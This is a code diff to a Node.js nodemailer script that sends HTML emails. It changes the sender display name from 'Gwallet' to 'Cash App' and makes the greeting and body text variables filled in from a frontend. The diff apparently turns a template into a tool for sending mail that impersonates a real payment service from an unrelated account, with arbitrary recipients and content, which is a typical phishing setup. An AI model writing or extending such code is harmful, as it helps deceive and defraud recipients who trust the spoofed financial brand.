@@ -44,12 +44,12 @@ const transporter = nodemailer.createTransport({
 
   // Email options
   const mailOptions = {
-    from: `"Gwallet" <${process.env.EMAIL_USER}>`,
+    from: `"Cash App" <${process.env.EMAIL_USER}>`,
     to: to, // Recipient email from frontend
     subject: `${subject}`,
     text: `Hello ${sanitizedName}!\n\nThank you for subscribing! This email contains updates and images in HTML format, but your email client is displaying the plain-text version. Visit our website for more information: https://x.com`,
     html: `
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -66,7 +66,7 @@ const transporter = nodemailer.createTransport({
           <!-- Header -->
           <tr>
             <td style="padding: 20px; text-align: center; background-color: #ffffff;">
-              <h1 style="font-size: 24px; margin: 0; color: #333333;">Welcome to [Your Company]</h1>
+              <h1 style="font-size: 24px; margin: 0; color: #333333;">Welcome ${sanitizedName}</h1>
             </td>
           </tr>
           <!-- Body -->
@@ -74,7 +74,7 @@ const transporter = nodemailer.createTransport({
             <td style="padding: 20px 30px; text-align: left;">
               <p style="margin: 0 0 15px; line-height: 1.5;">Hi [Recipient Name],</p>
               <p style="margin: 0 0 15px; line-height: 1.5;">
-                Thank you for joining us! We're excited to have you on board. Get started by exploring our platform with the button below.
+                ${maintext}
               </p>
               <!-- Button -->
               <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="margin: 20px auto;">
